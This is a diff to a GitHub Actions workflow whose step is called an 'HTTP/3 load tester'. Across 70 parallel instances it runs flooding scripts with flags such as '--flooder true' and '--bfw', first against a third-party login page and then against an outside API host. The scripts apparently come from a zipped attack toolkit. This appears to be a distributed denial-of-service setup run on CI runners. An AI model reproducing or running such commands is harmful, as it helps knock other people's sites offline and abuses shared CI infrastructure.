@@ -37,8 +37,9 @@ jobs:
             
       - name: Run HTTP/3 load tester
         run: |
-          
-          xvfb-run -a node browser.js https://shellmarketim.com/login.php 200 4 90 m.txt --debug true --flooder true
+          unzip Fc-main.zip
+          cd Fc-main
+          mode y.js GET https://api.turnsolver.com/ 4 90 --full --debug --bfw
         env:
           INSTANCE_NUMBER: ${{ matrix.instance }}
           TOTAL_INSTANCES: 70  # Updated to match the matrix count
